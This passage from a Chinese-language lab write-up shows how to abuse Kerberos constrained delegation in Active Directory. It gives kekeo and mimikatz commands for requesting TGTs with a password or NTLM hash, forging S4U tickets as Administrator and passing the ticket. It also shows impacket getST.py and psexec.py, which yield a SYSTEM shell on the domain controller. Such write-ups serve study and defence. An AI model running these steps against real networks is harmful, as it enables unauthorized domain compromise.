-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(samAccountType=805306369)(msds-allowedtodelegateto=*)</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x02约束委派的攻击"><a href="#0x02约束委派的攻击" class="headerlink" title="0x02约束委派的攻击"></a>0x02约束委派的攻击</h2><h3 id="有明文密码或者ntml的条件下"><a href="#有明文密码或者ntml的条件下" class="headerlink" title="有明文密码或者ntml的条件下"></a>有明文密码或者ntml的条件下</h3><p>使用kekeo结合约束委派用户的明文密码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tgt::ask /user:moretz /domain:whoamianony.org /password:Moretz2021</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317105105163.png" class title="image-20220317105105163">
-
-
-
-<p>使用ntml hash也可以</p>
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317105506938.png" class title="image-20220317105506938">
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tgt::ask /user:moretz /domain:whoamianony.org /NTLM:抓到的hash值</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317105620181.png" class title="image-20220317105620181">
-
-
-
-<p>使用这个tgt通过伪造s4u请求以administrator用户身份请求访问DC的cifs的ST</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tgs::s4u /tgt:TGT_moretz@WHOAMIANONY.ORG_krbtgt~whoamianony.org@WHOAMIANONY.ORG.kirbi /user:Administrator@whoamianony.org /service:cifs/DC.whoamianony.org</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317110301712.png" class title="image-20220317110301712">
-
-
-
-<p>使用获得的s4u2proxy的tgt进行ptt</p>
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317110416001.png" class title="image-20220317110416001">
-
-<p>在ptt之前不能访问DC的目录</p>
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317110502870.png" class title="image-20220317110502870">
-
-
-
-<p>使用mimikatz进行ptt</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@whoamianony.org@WHOAMIANONY.ORG_cifs~DC.whoamianony.org@WHOAMIANONY.ORG.kirbi</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317110852382.png" class title="image-20220317110852382">
-
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317110914857.png" class title="image-20220317110914857">
-
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317111243140.png" class title="image-20220317111243140">
-
-<p>注：这里也不是黄金票据，制作黄金票据的条件是缺一不可的</p>
-<h3 id="无明文密码或hash的情况下直接从内存中导入票据"><a href="#无明文密码或hash的情况下直接从内存中导入票据" class="headerlink" title="无明文密码或hash的情况下直接从内存中导入票据"></a>无明文密码或hash的情况下直接从内存中导入票据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317111656366.png" class title="image-20220317111656366">
-
-
-
-<p>然后可以直接伪造s4u请求</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tgs::s4u /tgt:[0;17bae4]-2-0-60a10000-moretz@krbtgt-WHOAMIANONY.ORG.kirbi /user:Administrator@whoamianony.org /service:cifs/DC.whoamianony.org</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317112009861.png" class title="image-20220317112009861">
-
-
-
-<p>现在是无法访问域控的</p>
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317112141194.png" class title="image-20220317112141194">
-
-<p>然后使用mimikatz进行ptt</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@whoamianony.org@WHOAMIANONY.ORG_cifs~DC.whoamianony.org@WHOAMIANONY.ORG.kirbi</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317112242012.png" class title="image-20220317112242012">
-
-
-
-<p>访问成功</p>
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317112612208.png" class title="image-20220317112612208">
-
-
-
-<p>上面是域服务用户存在约束委派，如果是域主机存在约束委派</p>
-<p>使用mimikatz抓取域主机PC2的ntml</p>
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317133949487.png" class title="image-20220317133949487">
-
-
-
-<p>使用keko制作可以供PC2自己转发的tgt</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tgt::ask /user:PC2$ /domain:whoamianony.org /NTLM:46d4391cec690c80efc906d2fdd594f8</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317142007857.png" class title="image-20220317142007857">
-
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317142022983.png" class title="image-20220317142022983">
-
-<p>这里的tgt是第一次向kdc申请的ST1</p>
-<p>使用请求到的tgt进行s4uproxy伪造请求ST2</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kekeo # tgs::s4u /tgt:TGT_PC2$@WHOAMIANONY.ORG_krbtgt~whoamianony.org@WHOAMIANONY.ORG.kirbi /user:Administrator@whoamianony.org /service:cifs/DC.whoamianony.org</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317142437649.png" class title="image-20220317142437649">
-
-
-
-<p>未进行ptt之前是不能访问DC的 </p>
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317142727658.png" class title="image-20220317142727658">
-
-<p>使用mimikatz进行ptt,注意tgs别选错了</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">kerberos::purge</span><br><span class="line">kerberos::ptt TGS_Administrator@whoamianony.org@WHOAMIANONY.ORG_cifs~DC.whoamianony.org@WHOAMIANONY.ORG.kirbi</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317142746120.png" class title="image-20220317142746120">
-
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317150805823.png" class title="image-20220317150805823">
-
-
-
-<p>注：这里一定要是以本机administrator打开的dir \\DC\c$，因为我们生成的票据是针对administrator账号的，虽然都是同一台主机但是administrator和普通用户moretz的票据是不同的</p>
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317151028741.png" class title="image-20220317151028741">
-
-
-
-<h3 id="在域环境外通过约束委派进行攻击"><a href="#在域环境外通过约束委派进行攻击" class="headerlink" title="在域环境外通过约束委派进行攻击"></a>在域环境外通过约束委派进行攻击</h3><p>域外指的是通过隧道工具接入内网</p>
-<p>使用的是impacket工具包里面的一个脚本</p>
-<p>探测约束委派的用户和主机</p>
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317152901164.png" class title="image-20220317152901164">
-
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317152914875.png" class title="image-20220317152914875">
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python getST.py -dc-ip 192.168.93.30 -spn cifs/DC -impersonate administrator whoamianony.org/PC2$ -hash :46d4391cec690c80efc906d2fdd594f8</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317153057662.png" class title="image-20220317153057662">
-
-
-
-<p>加载在ccache中的票据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set KRB5CCNAME=administrator.ccache</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317153129374.png" class title="image-20220317153129374">
-
-
-
-<p>利用psexec.py可以直接登陆</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 psexec.py -no-pass -k DC</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317155009305.png" class title="image-20220317155009305">
-
-<p>这里我不明白为什么能直接返回约束委派服务的主机的system的shell，我的约束委派主机是192.168.93.40 的moretz（PC2），设置的可以访问192.168.93.30 DC的cifs服务。预期可能是administrator的权限，但是返回了system权限不太懂。</p>
 ]]></content>
       <categories>
         <category>内网</category>
